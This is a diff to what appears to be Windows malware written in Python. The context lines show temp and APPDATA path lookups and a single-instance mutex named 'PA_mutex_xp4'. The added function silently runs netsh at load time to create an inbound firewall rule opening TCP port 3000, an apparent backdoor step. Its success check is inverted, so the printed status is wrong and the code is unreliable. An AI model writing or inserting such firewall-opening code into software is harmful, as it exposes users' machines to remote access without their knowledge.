@@ -11,6 +11,15 @@ strPath = os.path.realpath(sys.argv[0])  # get file path
 TMP = os.environ["TEMP"]  # get temp path
 APPDATA = os.environ["APPDATA"]
 
+#OPEN PORT
+def openPort():
+        if(os.system('netsh advfirewall firewall add rule name="Open Port 3000" dir=in action=allow protocol=TCP localport=3000')):
+            print("Open")
+        else:
+            print("NOT OPEN")
+
+openPort()
+
 
 # function to prevent multiple instances
 mutex = win32event.CreateMutex(None, 1, "PA_mutex_xp4")
